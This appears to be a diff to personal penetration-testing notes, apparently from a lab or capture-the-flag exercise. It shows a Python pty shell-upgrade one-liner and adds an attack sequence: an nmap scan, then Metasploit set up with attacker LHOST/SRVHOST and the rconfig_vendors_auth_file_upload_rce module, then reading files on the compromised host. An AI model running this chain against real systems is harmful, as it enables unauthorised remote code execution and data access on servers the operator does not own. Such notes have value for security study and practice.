@@ -483,4 +483,10 @@ the default shell may be refer as non-tty shell limited func and can often preve
 \\Interactive Python3
 $python -c 'import pty; pty.spawn("/bin/sh")'
 Whoami
-this command use python to import the pty module then uses the pty.spawn function to execute the bourne shell binary(/bin/sh) we now have a prompt (sh-4.2$) and access to more sys command to move about the system as we please
+this command use python to import the pty module then uses the pty.spawn function to execute the bourne shell 
+binary(/bin/sh) we now have a prompt (sh-4.2$) and access to more sys command to move about the system as we please
+$sudo nmap -A -Pn <target>  > it show 80 443 mean it's an web ser
+$msfconsole -q  > set RHOSTS <target>  >  set LHOST <atk>  >  set SRVHOST <atk> > exploit
+use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
+$cd /devicedetails  > cat hostnameinfor.txt
+
